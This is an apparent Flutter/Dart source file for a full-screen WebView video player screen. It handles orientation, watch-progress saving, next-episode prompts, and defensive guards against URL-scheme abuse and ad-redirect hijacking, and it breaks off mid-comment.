import 'dart:async';
import 'dart:collection';
import 'dart:convert';

import 'package:flutter/foundation.dart';
import 'package:flutter/gestures.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:go_router/go_router.dart';
import 'package:window_manager/window_manager.dart';

import '../../../core/theme/app_colors.dart';
import '../../../core/utils/host_utils.dart';
import '../../../core/utils/player_platform.dart';
import '../../../domain/entities/media_item.dart';
import '../../../domain/entities/media_type.dart';
import '../../../domain/entities/user_progress.dart';
import '../../../plugins/event_bridge/event_bridge.dart';
import '../../../plugins/protocol/plugin_url_resolver.dart';
import '../../../plugins/protocol/trigger_hook.dart';
import '../../providers/plugin_providers.dart';
import '../../providers/settings_providers.dart';
import '../../providers/watch_history_providers.dart';
import '../../providers/webview_providers.dart';
import '../../router/app_router.dart';
import '../../../data/services/remote_blocklist.dart';
import 'player_scripts.dart';
import 'web_view_player_config.dart';
import 'widgets/next_episode_overlay.dart';
import 'widgets/player_error_view.dart';
import 'widgets/player_window_actions.dart';

// ─── Injected JS ────────────────────────────────────────────────────────────
//
// The scripts injected into every WebView session used to live here as
// const Dart strings (~900 lines). They moved to `assets/js/` and are
// loaded once at app startup by `PlayerScripts.load()` (see main.dart).
//
// The `UserScript` list assembled from those files is built in
// `web_view_player_config.dart` — see `WebViewPlayerConfig.buildUserScripts`
// for the ordering rationale and platform-conditional inclusion logic.

/// Full-screen WebView player.
///
/// Design decisions:
/// - **No full-body GestureDetector** — the previous swipe-to-dismiss
///   wrapper was claiming all vertical drags in Flutter's gesture arena
///   before the WebView could receive them, breaking internal list scrolling.
///   Dismiss is handled by the × button and the Android back button only.
/// - **`gestureRecognizers`** — explicitly transfers vertical drag, horizontal
///   drag, and scale gesture ownership to the WebView so Flutter widgets
///   above it never compete.
/// - **`gestureNavigationEnabled: false`** — disables iOS WebView's built-in
///   swipe-to-navigate-back, which would otherwise conflict with content
///   that needs horizontal swiping (e.g. carousels, tab bars inside the player).
/// - **Landscape lock** — `SystemChrome.setPreferredOrientations` is called
///   in `initState`; `dispose` fully restores portrait + system UI.
///   The iOS `Info.plist` already declares both landscape orientations so the
///   lock works identically on iOS and Android.
class WebViewPlayerScreen extends ConsumerStatefulWidget {
  final String url;
  final MediaItem media;
  final String pluginName;

  /// Plugin ID for saving as [UserProgress.lastPluginId] when progress is saved.
  final String? pluginId;

  /// If > 0, the player will attempt to seek the <video> to this position
  /// (in seconds) once the page finishes loading.
  final double resumeTimeSeconds;

  /// For TV episodes — used when the bridge event has null season/episode.
  final int? season;
  final int? episode;

  const WebViewPlayerScreen({
    super.key,
    required this.url,
    required this.media,
    required this.pluginName,
    this.pluginId,
    this.resumeTimeSeconds = 0,
    this.season,
    this.episode,
  });

  @override
  ConsumerState<WebViewPlayerScreen> createState() =>
      _WebViewPlayerScreenState();
}

class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
    with WidgetsBindingObserver, WindowListener {
  /// Page-load progress as a notifier rather than setState state — only the
  /// progress bar and the initial-load overlay need to react. Putting it in
  /// `setState` rebuilt the entire `Scaffold > Stack` tree (including the
  /// `InAppWebView`) on every percent during a load.
  final ValueNotifier<double> _loadProgress = ValueNotifier<double>(0);

  bool _isNavigating = false;

  /// `true` when this screen is being torn down because the user pressed
  /// "Play Next" — i.e. we're handing off to another `/player` route.
  ///
  /// `dispose()` consults this to decide whether to call `_restorePortrait`.
  /// On iOS, route transition + dispose ordering means the OLD screen's
  /// `_restorePortrait` would otherwise queue `setPreferredOrientations`
  /// for portrait *after* the NEW screen's `_lockLandscape` had already
  /// queued landscape — iOS honours the most recent preference and forces
  /// a rotation to portrait under the new player. Skipping the restore on
  /// handoff keeps the device in landscape across episodes.
  bool _navigatingToAnotherPlayer = false;

  EventBridge? _eventBridge;

  // Stored so imperative operations (reload, goBack, etc.) are possible.
  InAppWebViewController? _controller;

  bool _hasError = false;
  String _errorMsg = '';
  bool _isFullScreen = false;

  Timer? _controlsTimer;
  bool _showControls = true;

  /// Last time `_resetControlsTimer` actually re-armed `_controlsTimer`
  /// (epoch ms). Used to coalesce the per-frame pointer-event flood
  /// (`Listener.onPointerHover` fires on every mouse move on Windows) into
  /// at most one Timer cancel + recreate per `_kControlsTimerCoalesceMs`.
  int _lastControlsTimerResetMs = 0;
  static const int _kControlsTimerCoalesceMs = 500;

  bool _showNextEpisodeOverlay = false;
  bool _overlayActive = false; // Controls animation (slide/fade)
  bool _dismissedNextEpisodeOverlay = false;
  int? _lastNextEpisodeTriggered; // episode number to avoid repeat popups
  Timer? _overlayTimer;

  /// Delay between the iOS 16+ "supported orientations" relaxation call and
  /// the actual landscape lock. Without it, the second
  /// `setPreferredOrientations` call can land before the system has finished
  /// committing the first, producing the *"None of the requested
  /// orientations are supported"* runtime error.
  ///
  /// 50 ms has held up reliably on iPhones from XS through 15 Pro; bump this
  /// (or switch to `addPostFrameCallback`) if the error reappears on slower
  /// devices.
  static const Duration _kIosOrientationCommitDelay = Duration(
    milliseconds: 50,
  );

  /// Latches `true` the first time the main frame finishes loading. Once set,
  /// any subsequent main-frame navigation is checked against the original
  /// host base — even if `_loadProgress` has dropped to 0 because the
  /// navigation that's being inspected is itself the redirect. Without this
  /// latch, programmatic `location.assign('evil.com')` calls slip through
  /// the cross-domain gate during the brief window when progress is < 100.
  bool _initialLoadComplete = false;

  /// Cached "base" of the originally requested URL's host (e.g. `example.com`
  /// for `https://www.example.com/embed/123`). Computed once in [initState] so
  /// every navigation check is an O(1) string compare.
  ///
  /// Backed by the Public Suffix List (see [HostUtils]) so multi-part TLDs
  /// like `foo.co.uk` are handled correctly.
  late final String _initialHostBase = HostUtils.registeredDomain(
    Uri.tryParse(widget.url)?.host ?? '',
  );

  /// Stable cache key for [nextEpisodeForProgressProvider] — only mediaId,
  /// mediaType, season, episode participate in `UserProgress.==`/`hashCode`,
  /// so we don't need to allocate a new instance per build with a fresh
  /// `DateTime.now()`. Hoisted into a field to remove allocator pressure
  /// from the player-chrome rebuild hot path.
  late final UserProgress _nextEpisodeKey = UserProgress(
    mediaId: widget.media.tmdbId.toString(),
    mediaType: 'tv',
    title: widget.media.title,
    percentage: 100,
    currentTime: 0,
    duration: 0,
    season: widget.season,
    episode: widget.episode,
    lastPlayedDate: DateTime.fromMillisecondsSinceEpoch(0),
  );

  /// Cached `ProviderContainer` for use inside `dispose()`.
  ///
  /// Riverpod 3.x throws
  /// `Bad state: Using "ref" when a widget is about to or has been unmounted`
  /// if `ref` is touched during `dispose()` — `ref` depends on
  /// `BuildContext`, which is being deactivated. The framework's own
  /// error message points to the fix: cache the `ProviderContainer` in a
  /// field while the widget is still active and call `.invalidate(...)`
  /// on it directly.
  ///
  /// Captured in `initState` with `listen: false` so we don't register an
  /// InheritedWidget dependency that would cause `didChangeDependencies`
  /// to fire (and re-assign a `late final` — the previous source of the
  /// `LateInitializationError`).
  late final ProviderContainer _providerContainer;

  /// Latched in [dispose] before `super.dispose()` runs. Used by every
  /// WebView callback that the native side can fire after we've torn down
  /// — `shouldOverrideUrlLoading`, `shouldInterceptRequest`,
  /// `onProgressChanged` — to bail out before touching `ref`,
  /// `_loadProgress`, or any other field whose lifetime is tied to the
  /// State. `mounted` flips false only after `super.dispose()` returns,
  /// which is too late for the Windows path where `_cleanupWebView`
  /// deliberately skips `stopLoading()`.
  bool _disposed = false;

  // ─── Gesture recognizers — transferred to the WebView ────────────────────
  // Giving explicit ownership of these gestures to the WebView prevents the
  // Flutter widget tree from competing, which is the root cause of scroll
  // breakage in embedded lists.
  // NOTE: LongPressGestureRecognizer was intentionally removed — it causes
  // a ~500 ms delay in the gesture arena before taps are forwarded to the
  // WebView, making buttons appear to require a "double click" to interact.
  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);

    // Cache the ProviderContainer NOW (widget is mounted, context is
    // active) so dispose() can call .invalidate() without touching `ref`.
    // `listen: false` uses `getElementForInheritedWidgetOfExactType` under
    // the hood, which — unlike `dependOnInheritedWidgetOfExactType` — is
    // safe in `initState` and doesn't register a dependency that would
    // make `didChangeDependencies` fire later.
    _providerContainer = ProviderScope.containerOf(context, listen: false);

    // Fail-closed at construction. Three checks:
    //
    //   1. The URI must parse.
    //   2. The scheme MUST be http or https. Without this, a hostile or
    //      tampered plugin manifest (e.g. one imported via
    //      ExportImportService from an untrusted `.spovies` backup) could
    //      hand us `intent://...` / `content://...` / `file://...` /
    //      `javascript:...` URIs. `InAppWebView.initialUrlRequest` loads
    //      them directly — `shouldOverrideUrlLoading` is NOT consulted for
    //      the initial URL on Android — so without this gate the scheme
    //      block list further down only protects *subsequent* navigations.
    //   3. The host must be non-empty. Otherwise the cross-domain
    //      navigation guard at the bottom of `shouldOverrideUrlLoading`
    //      silently disables itself and any cross-frame redirect slips
    //      through.
    //
    // The install path (`PluginManifestModel.fromJson` →
    // `UrlValidator.validateUrlTemplate`) already rejects non-http(s)
    // schemes; this is the defence-in-depth that catches anything that
    // gets here regardless.
    final initialUri = Uri.tryParse(widget.url);
    final initialScheme = initialUri?.scheme.toLowerCase() ?? '';
    final initialHost = initialUri?.host ?? '';
    if (initialUri == null ||
        (initialScheme != 'http' && initialScheme != 'https') ||
        initialHost.isEmpty) {
      _hasError = true;
      _errorMsg = 'Invalid stream URL';
      return;
    }

    // Delay the orientation lock until after the first frame on iOS to
    // prevent race conditions with the screen transition.
    if (PlayerPlatform.isIOS) {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (mounted) _lockLandscape();
      });
    } else {
      _lockLandscape();
    }

    _eventBridge = EventBridge(onProgressUpdate: _onProgressUpdate);
    if (PlayerPlatform.isWindows) {
      // Subscribe to window-manager events so F11 / native chrome
      // fullscreen toggles update `_isFullScreen` — previously this
      // state desynced whenever the user toggled fullscreen outside our
      // own `_toggleFullScreen` button.
      windowManager.addListener(this);
      _checkFullScreen();
    }
    _resetControlsTimer();
  }

  // ── WindowListener (Windows only) ────────────────────────────────────────
  // Mixin methods default to no-op; we override only the two events we care
  // about. These fire on F11, double-click title-bar, and the OS shortcuts.

  @override
  void onWindowEnterFullScreen() {
    if (mounted && !_isFullScreen) setState(() => _isFullScreen = true);
  }

  @override
  void onWindowLeaveFullScreen() {
    if (mounted && _isFullScreen) setState(() => _isFullScreen = false);
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    super.didChangeAppLifecycleState(state);
    // The WebView's JS bridge only forwards a `pause` event when the
    // streaming provider's <video> element itself fires `pause` — that's
    // unreliable across plugins (HLS.js wrappers, custom MSE, etc.). When
    // the OS sends us to the background we flush the Continue Watching row
    // ourselves so the Home screen reflects the latest saved progress on
    // the way back in.
    //
    // Uses the cached `_providerContainer` — same rationale as in dispose:
    // the lifecycle callback can race with widget deactivation, and `ref`
    // throws once the BuildContext is unmounted.
    if ((state == AppLifecycleState.paused ||
            state == AppLifecycleState.inactive ||
            state == AppLifecycleState.hidden) &&
        _progressDirty) {
      _providerContainer.invalidate(continueWatchingProvider);
      _providerContainer.invalidate(episodeProgressProvider);
      _progressDirty = false;
    }
  }

  void _resetControlsTimer() {
    if (!mounted) return;

    // The hot path: pointer move + JS user-activity events fire continuously.
    // The JS bridge already throttles to 500 ms, but we still get pointer
    // moves on every frame on Windows/desktop. Only call setState when
    // something actually needs to change — otherwise we're scheduling an
    // entire rebuild of the player chrome on every mouse twitch.
    final overlayShouldShow =
        _showNextEpisodeOverlay && !_dismissedNextEpisodeOverlay;
    final overlayNeedsUpdate = overlayShouldShow && !_overlayActive;

    if (!_showControls || overlayNeedsUpdate) {
      setState(() {
        _showControls = true;
        if (overlayNeedsUpdate) {
          _overlayActive = true;
          _startOverlayTimer();
        }
      });
    }

    // Coalesce Timer churn — the previous implementation cancelled and
    // re-created a 5 s Timer on every pointer event, which on Windows
    // fires once per frame (~60 Hz) while the mouse moves. Re-arm at
    // most once per _kControlsTimerCoalesceMs; the 5 s controls-hide
    // delay then slips by at most that interval after the user stops.
    final now = DateTime.now().millisecondsSinceEpoch;
    if (now - _lastControlsTimerResetMs < _kControlsTimerCoalesceMs) return;
    _lastControlsTimerResetMs = now;

    _controlsTimer?.cancel();
    _controlsTimer = Timer(const Duration(seconds: 5), () {
      if (mounted) setState(() => _showControls = false);
    });
  }

  void _startOverlayTimer() {
    _overlayTimer?.cancel();
    _overlayTimer = Timer(const Duration(seconds: 5), () {
      if (mounted && _overlayActive) {
        setState(() => _overlayActive = false);
      }
    });
  }

  Future<void> _checkFullScreen() async {
    final isFullscreen = await windowManager.isFullScreen();
    if (!mounted) return;
    // The WindowListener (registered just above this call in initState)
    // may have already updated `_isFullScreen` while this await was
    // suspended — e.g. the user hit F11 externally. Don't clobber the
    // listener's value: only push state if it would actually change.
    if (_isFullScreen != isFullscreen) {
      setState(() => _isFullScreen = isFullscreen);
    }
  }

  @override
  void dispose() {
    // Latch FIRST so any in-flight WebView callback that fires between
    // here and `super.dispose()` short-circuits (mounted stays true until
    // super.dispose() returns).
    _disposed = true;
    WidgetsBinding.instance.removeObserver(this);
    if (PlayerPlatform.isWindows) {
      windowManager.removeListener(this);
    }
    _controlsTimer?.cancel();
    _overlayTimer?.cancel();
    _cleanupWebView();
    // Break the retain cycle — the bridge closes over `_onProgressUpdate`
    // which captures `this`. A nulled reference lets the GC reclaim both
    // the bridge and any pending callback chain.
    _eventBridge = null;
    _loadProgress.dispose();
    // If progress was written during this session but never flushed via a
    // pause/ended event (e.g. the user just closed the player), refresh
    // the Continue Watching row once on the way out.
    //
    // Use the cached `_providerContainer` directly — `ref.invalidate(...)`
    // here throws `Bad state: Using "ref" when a widget is about to or has
    // been unmounted is unsafe` in Riverpod 3.x because `ref` depends on
    // the deactivating BuildContext.
    if (_progressDirty) {
      _providerContainer.invalidate(continueWatchingProvider);
      _providerContainer.invalidate(episodeProgressProvider);
    }
    // Skip the orientation restore when handing off to another player —
    // see [_navigatingToAnotherPlayer] for the iOS race this avoids.
    if (!_navigatingToAnotherPlayer) {
      _restorePortrait();
    }
    super.dispose();
  }

  /// Centralized cleanup to ensure the WebView stops all background work.
  /// Called before navigation and during disposal.
  void _cleanupWebView() {
    final controller = _controller;
    if (controller != null) {
      // Drop the JS handler BEFORE nulling the controller reference.
      // The callback closure registered in `onWebViewCreated` captures
      // `this` (through `_eventBridge` and `_resetControlsTimer`), so
      // leaving the handler attached pins the State alive for as long as
      // the native controller exists. On Windows WebView2 the native
      // controller can outlive the Flutter platform view, so a leaked
      // handler leaks one State per playback.
      try {
        controller.removeJavaScriptHandler(handlerName: 'spoviesEventBridge');
      } catch (e) {
        // `removeJavaScriptHandler` can throw on Windows during
        // transitional WebView2 states (same root cause as the
        // E_INVALIDARG we already handle in `_recoverFromHijack`). The
        // controller is about to be released anyway — log and move on.
        if (kDebugMode) {
          debugPrint('Player: removeJavaScriptHandler failed: $e');
        }
      }
      // Windows is sensitive to imperative calls during disposal transitions.
      // We nullify the reference and let the native platform view dispose itself.
      if (!PlayerPlatform.isWindows) {
        controller.stopLoading();
      }
      _controller = null;
    }
  }

  // ─── Hijack recovery ─────────────────────────────────────────────────────
  //
  // Used by two different streaming-page attacks that bypass our normal
  // navigation guards on Windows WebView2:
  //
  //   1. `about:blank` click-jacker — overlay anchor on the embed page,
  //      detected at `onUpdateVisitedHistory`. WebView2 skips
  //      `shouldOverrideUrlLoading` AND `onLoadStart` for the synthetic
  //      main-frame navigation that fires after `onCreateWindow` rejects
  //      a `target="_blank"` anchor with `hasGesture: true`, so
  //      `onUpdateVisitedHistory` is the earliest signal.
  //   2. Microsoft Defender SmartScreen takeover — embed page server-side
  //      redirects to an ad domain SmartScreen has flagged, replacing the
  //      whole player with a red warning. Detected at `onTitleChanged`.
  //
  // Both signals fire only on Windows (WebView2). Both recoveries do the
  // same thing: stop the load, then `goBack()` (preserves embed-page
  // state) or `loadUrl(widget.url)` (fallback).
  //
  // Two layers of rate-limiting:
  //
  //   • Per-type cooldown (`_kRecoveryCooldown`, 2 s) — debounces tight
  //     re-entry of the SAME signal. SmartScreen fires `onTitleChanged`
  //     multiple times for the same warning; about:blank fires several
  //     `onUpdateVisitedHistory` callbacks during the transition. The
  //     cooldown is keyed by recovery type so an about:blank recovery
  //     does NOT silence the SmartScreen recovery that fires
  //     milliseconds later for the same root incident (Provider D → bad
  //     redirect → both signals fire together).
  //
  //   • Circuit breaker — true sliding window over the last
  //     `_kRecoveryWindowDuration`. We track each recovery's timestamp
  //     in `_recentRecoveries`; on every call we drop stale entries
  //     and trip the breaker when the live count crosses
  //     `_kMaxRecoveriesPerWindow`. This protects against backends like
  //     `example.com` that 522 + redirect to an
  //     ad SmartScreen flags in a loop — after 3 attempts in 15 s we
  //     surface an error and let the user pick a different plugin.
  //     Counter is GLOBAL across types so a fast-cycling Provider D page
  //     that trips BOTH signals on each load still escalates to the
  //     error after 3 round-trips. Failed controller calls (E_INVALIDARG
  //     during transitional WebView2 states) roll back their entry so
  //     they don't silently burn the breaker budget without actually
  //     recovering anything.
  final Map<String, DateTime> _lastRecoveryByType = {};
  final List<DateTime> _recentRecoveries = [];
  static const Duration _kRecoveryCooldown = Duration(seconds: 2);
  static const int _kMaxRecoveriesPerWindow = 3;
  static const Duration _kRecoveryWindowDuration = Duration(seconds: 15);

  Future<void> _recoverFromHijack(
    InAppWebViewController controller,
    String reason, {
    required String type,
  }) async {
    final now = DateTime.now();
    final lastForType = _lastRecoveryByType[type];
    if (lastForType != null &&
        now.difference(lastForType) < _kRecoveryCooldown) {
      if (kDebugMode) {
        debugPrint('Player: $type recovery skipped (cooldown): $reason');
      }
      return;
    }

    // Sliding-window prune: drop entries older than the window. This is
    // the difference from the previous fixed-window implementation that
    // would lock the user out at a healthy long-term recovery rate when
    // recoveries clustered just inside the original window.
    _recentRecoveries.removeWhere(
      (t) => now.difference(t) > _kRecoveryWindowDuration,
    );
    if (_recentRecoveries.length >= _kMaxRecoveriesPerWindow) {
      if (kDebugMode) {
        debugPrint(
          'Player: recovery circuit breaker tripped '
          '(${_recentRecoveries.length} attempts in '
          '${_kRecoveryWindowDuration.inSeconds}s) — showing error',
        );
      }
      if (mounted) {
        setState(() {
          _hasError = true;
          _errorMsg =
              'This source keeps redirecting or timing out.\n'
              'Try a different plugin or server.';
        });
      }
      return;
    }

    _recentRecoveries.add(now);
    _lastRecoveryByType[type] = now;
    if (kDebugMode) {
      debugPrint(
        'Player: hijack recovery '
        '(${_recentRecoveries.length}/$_kMaxRecoveriesPerWindow, '
        'type=$type) — $reason',
      );
    }

    // Wrap every native controller call in try/catch — flutter_inappwebview's
    // Windows C++ side has been observed throwing `E_INVALIDARG` (0x80070057)
    // at `in_app_webview.cpp:1231` when stopLoading/goBack/loadUrl run during
    // a transitional WebView2 state. We don't want those to leak as
    // unhandled async errors.
    try {
      await controller.stopLoading();
      if (!mounted) return;
      // Prefer goBack() — WebView2's history still has the embed page, so
      // the previous page state (server selection, video element) is
      // preserved. Fall back to a fresh load only if there's nothing to
      // go back to.
      final canGoBack = await controller.canGoBack();
      if (!mounted) return;
      if (canGoBack) {
        await controller.goBack();
      } else {
        await controller.loadUrl(
          urlRequest: URLRequest(url: WebUri(widget.url)),
        );
      }
    } catch (e, st) {
      if (kDebugMode) {
        debugPrint('Player: recovery controller call failed: $e\n$st');
      }
      // The native call failed — likely WebView2 was mid-transition.
      // Roll back the recovery entry we recorded above. Without the
      // rollback, a sequence of failed controller calls (each from a
      // recurring transitional state) would silently burn the breaker
      // budget without performing any real recovery, and the user
      // would see the "try a different plugin" error even though we
      // never managed to attempt a recovery.
      if (_recentRecoveries.isNotEmpty && _recentRecoveries.last == now) {
        _recentRecoveries.removeLast();
      }
    }
  }

  // ─── Orientation ─────────────────────────────────────────────────────────

  Future<void> _lockLandscape() async {
    // Orientation lock and immersive mode are mobile-only APIs.
    if (!PlayerPlatform.supportsOrientationLock) return;

    if (PlayerPlatform.isIOS) {
      // First, relax the supported set so iOS 16+ doesn't reject the
      // landscape-only call below with "None of the requested orientations
      // are supported".
      await SystemChrome.setPreferredOrientations([
        DeviceOrientation.landscapeLeft,
        DeviceOrientation.landscapeRight,
        DeviceOrientation.portraitUp,
      ]);
      await Future.delayed(_kIosOrientationCommitDelay);
      // After the await: if the user popped the route in this 50 ms
      // window, the second `setPreferredOrientations` below would land on
      // the parent screen, leaving it stuck in landscape + immersive.
      if (_disposed) return;
    }

    await SystemChrome.setPreferredOrientations([
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);
    // Immersive mode: hides nav bar + status bar for full viewport.
    await SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
  }

  Future<void> _restorePortrait() async {
    if (!PlayerPlatform.supportsOrientationLock) return;
    await SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
    await SystemChrome.setEnabledSystemUIMode(
      SystemUiMode.manual,
      overlays: SystemUiOverlay.values,
    );
  }

  // ─── Progress Tracking ───────────────────────────────────────────────────

  /// Tracks whether anything has been persisted this session so we know to
  /// invalidate the Continue Watching list once on lifecycle events.
  bool _progressDirty = false;

  void _onProgressUpdate(PlayerEvent event) {
    if (!mounted) return;
    if (event.duration <= 0) return;

    final progress = UserProgress(
      mediaId: widget.media.tmdbId.toString(),
      mediaType: widget.media.type.name,
      title: widget.media.title,
      posterPath: widget.media.posterPath,
      percentage: event.progress,
      currentTime: event.currentTime,
      duration: event.duration,
      season: event.season ?? widget.season,
      episode: event.episode ?? widget.episode,
      lastPlayedDate: DateTime.now(),
      lastPluginId: widget.pluginId,
    );

    // Fire-and-forget write with explicit error handling so a Hive write
    // failure can't escape as an unhandled async error.
    unawaited(
      ref
          .read(watchHistoryRepositoryProvider)
          .saveProgress(progress)
          .catchError((Object e, StackTrace st) {
            if (kDebugMode) debugPrint('saveProgress failed: $e');
          }),
    );
    _progressDirty = true;

    // Invalidate the Continue Watching row only on pause/ended — the
    // throttled timeupdate fires every ~5s during playback and used to
    // rebuild the home screen continuously. The repository write above
    // still happens every update so progress survives a crash.
    final isLifecycle =
        event.eventType == 'pause' || event.eventType == 'ended';
    if (isLifecycle) {
      ref.invalidate(continueWatchingProvider);
      ref.invalidate(episodeProgressProvider);
      _progressDirty = false;
    }

    // PlayerEvent.tryParse normalises progress to the 0–100 scale at the
    // parse boundary, so we use it directly here. The previous
    // "if (progress <= 1.0) *= 100" heuristic mis-fired at <1 % real
    // progress (e.g. 0.83 % → 83 %) and triggered the Next-Episode
    // overlay seconds into playback.
    final currentEp = event.episode ?? widget.episode;
    final pct = event.progress;

    if (widget.media.type == MediaType.tv && pct >= 95.0) {
      if (!_showNextEpisodeOverlay &&
          !_dismissedNextEpisodeOverlay &&
          _lastNextEpisodeTriggered != currentEp) {
        // _lastNextEpisodeTriggered is bookkeeping (read only in this method,
        // never in build) — assigning it inside setState is just convenient
        // grouping with _showNextEpisodeOverlay/_overlayActive which DO drive
        // the overlay's visibility.
        setState(() {
          _showNextEpisodeOverlay = true;
          _overlayActive = true;
          _lastNextEpisodeTriggered = currentEp;
          _startOverlayTimer();
        });
      }
    } else {
      // Reset dismissal + trigger-tracking when the user has scrubbed back
      // far enough to "re-arm" the overlay for this episode. Neither field
      // is read in build, so plain assignment is correct — wrapping in
      // setState would schedule a rebuild that does nothing.
      if (pct < 90.0) {
        _dismissedNextEpisodeOverlay = false;
        _lastNextEpisodeTriggered = null;
      }

      if (_showNextEpisodeOverlay && pct < 95.0) {
        _overlayTimer?.cancel();
        setState(() {
          _showNextEpisodeOverlay = false;
          _overlayActive = false;
        });
      }
    }
  }

  // ─── WebView config — see web_view_player_config.dart ───────────────────

  InAppWebViewSettings get _settings => WebViewPlayerConfig.buildSettings();

  List<UserScript> get _userScripts => WebViewPlayerConfig.buildUserScripts(
    scripts: PlayerScripts.instance,
    resumeTimeSeconds: widget.resumeTimeSeconds,
  );

  // ─── Build ───────────────────────────────────────────────────────────────

  @override
  Widget build(BuildContext context) {
    Widget content;
    if (PlayerPlatform.isWindows) {
      final envAsync = ref.watch(webViewEnvironmentProvider);
      content = envAsync.when(
        data: (env) {
          if (_hasError) return _buildErrorState();
          return _buildWebView(env);
        },
        loading: () => const Center(
          child: CircularProgressIndicator(color: AppColors.primary),
        ),
        // Render the error state directly without mutating widget state during
        // build — that would either trigger a setState-in-build assertion or
        // permanently latch _hasError, leaving the screen stuck if the env
        // provider later recovers. Retry simply invalidates the provider.
        error: (err, _) => _buildErrorState(
          overrideMessage: 'WebView initialization failed: $err',
          onRetry: () => ref.invalidate(webViewEnvironmentProvider),
        ),
      );
    } else {
      content = _hasError ? _buildErrorState() : _buildWebView();
    }

    return PopScope(
      canPop: false,
      onPopInvokedWithResult: (didPop, _) {
        if (didPop) return;
        // System back from inside the player jumps straight to /home
        // (skipping any intermediate /details/etc. route) so it lines up
        // with the shell-level "any page → home → exit prompt" contract.
        // The X button keeps the old one-level-pop behaviour via
        // [_dismiss] for users who want to return to the details screen.
        _backToHome();
      },
      child: Scaffold(
        backgroundColor: Colors.black,
        // A single Listener covers every pointer kind:
        //   • onPointerDown / onPointerMove → touch + held mouse
        //   • onPointerHover → bare mouse hover on desktop
        // The previous MouseRegion + Listener pair duplicated every mouse
        // event, calling _resetControlsTimer twice per frame on Windows.
        body: Listener(
          behavior: HitTestBehavior.translucent,
          onPointerDown: (_) => _resetControlsTimer(),
          onPointerMove: (_) => _resetControlsTimer(),
          onPointerHover: (_) => _resetControlsTimer(),
          child: Stack(
            children: [
              content,
              _buildLoadingOverlay(),
              _buildProgressBar(),
              _buildWindowActions(),
              _buildNextEpisodeOverlay(),
            ],
          ),
        ),
      ),
    );
  }

  // ─── WebView ─────────────────────────────────────────────────────────────

  Widget _buildWebView([WebViewEnvironment? environment]) {
    return LayoutBuilder(
      builder: (context, constraints) {
        if (constraints.maxWidth <= 0 || constraints.maxHeight <= 0) {
          return const SizedBox.expand();
        }

        return Focus(
          autofocus: true,
          onKeyEvent: (node, event) {
            // Always allow system volume keys to bubble up.
            if (event.logicalKey == LogicalKeyboardKey.audioVolumeUp ||
                event.logicalKey == LogicalKeyboardKey.audioVolumeDown ||
                event.logicalKey == LogicalKeyboardKey.audioVolumeMute) {
              return KeyEventResult.ignored;
            }

            // Ignore modifier keys to prevent Flutter's internal state tracker
            // from getting desynchronized (fixes "Alt Left" assertion crash).
            if (event.logicalKey == LogicalKeyboardKey.altLeft ||
                event.logicalKey == LogicalKeyboardKey.altRight ||
                event.logicalKey == LogicalKeyboardKey.controlLeft ||
                event.logicalKey == LogicalKeyboardKey.controlRight ||
                event.logicalKey == LogicalKeyboardKey.shiftLeft ||
                event.logicalKey == LogicalKeyboardKey.shiftRight) {
              return KeyEventResult.ignored;
            }

            // On Windows, we must return .handled for all other keys to prevent
            // the WebView from triggering framework assertions during layout.
            // On other platforms (Android/iOS), we return .ignored so system
            // and hardware keys work naturally.
            return PlayerPlatform.isWindows
                ? KeyEventResult.handled
                : KeyEventResult.ignored;
          },
          child: InAppWebView(
            // Full URL (not hashCode) — String hashCode collides, and a
            // collision here causes the framework to reuse the previous
            // WebView state for a different URL.
            key: ValueKey('spovies_player_${widget.url}'),
            webViewEnvironment: environment,
            preventGestureDelay: true,
            // Desktop platforms don't want any gesture competition with the
            // WebView. Mobile transfers vertical/horizontal drag + scale to
            // the WebView so embedded list scroll stays smooth.
            gestureRecognizers: PlayerPlatform.isDesktop
                ? const <Factory<OneSequenceGestureRecognizer>>{}
                : <Factory<OneSequenceGestureRecognizer>>{
                    Factory<VerticalDragGestureRecognizer>(
                      VerticalDragGestureRecognizer.new,
                    ),
                    Factory<HorizontalDragGestureRecognizer>(
                      HorizontalDragGestureRecognizer.new,
                    ),
                    Factory<ScaleGestureRecognizer>(ScaleGestureRecognizer.new),
                  },
            initialUrlRequest: URLRequest(url: WebUri(widget.url)),
            initialSettings: _settings,
            initialUserScripts: UnmodifiableListView(_userScripts),
            onWebViewCreated: (controller) {
              _controller = controller;
              controller.addJavaScriptHandler(
                handlerName: 'spoviesEventBridge',
                callback: (args) {
                  if (args.isEmpty || _disposed) return;
                  final rawMessage = args[0].toString();

                  // Parse the JSON ONCE at the boundary instead of doing a
                  // raw `rawMessage.contains('"type":"USER_ACTIVITY"')`
                  // substring check. The substring match collides with any
                  // payload that mentions the literal string in a nested
                  // field (e.g. `data.notes = "see \"type\":\"USER_ACTIVITY\""`),
                  // causing legitimate PLAYER_EVENTs to be silently dropped.
                  Map<String, dynamic>? parsed;
                  try {
                    final decoded = jsonDecode(rawMessage);
                    if (decoded is Map<String, dynamic>) parsed = decoded;
                  } catch (_) {
                    // Non-JSON payload — let EventBridge.handleMessage
                    // decide (it has its own try/catch for that case).
                  }
                  if (parsed?['type'] == 'USER_ACTIVITY') {
                    _resetControlsTimer();
                    return;
                  }
                  if (mounted) _eventBridge?.handleMessage(rawMessage);
                },
              );
            },
            onProgressChanged: (controller, progress) {
              // _disposed before mounted — the WebView's native side can
              // fire callbacks between `_loadProgress.dispose()` and
              // `super.dispose()`, when `mounted` is still true but the
              // notifier has already been torn down.
              if (_disposed || !mounted) return;
              // Latch once: powers the post-load cross-domain check in
              // shouldOverrideUrlLoading.
              if (progress >= 100) _initialLoadComplete = true;
              // ValueNotifier — only the progress bar + loading overlay
              // rebuild, not the whole Scaffold/Stack tree.
              _loadProgress.value = progress.toDouble();
            },
            onUpdateVisitedHistory: (controller, url, isReload) async {
              // ── Click-jacker about:blank recovery (Windows only) ─────
              //
              // Windows WebView2 skips BOTH `shouldOverrideUrlLoading`
              // AND `onLoadStart` for the synthetic main-frame
              // navigation that fires after we return `false` from
              // `onCreateWindow` on a `target="_blank"` anchor click
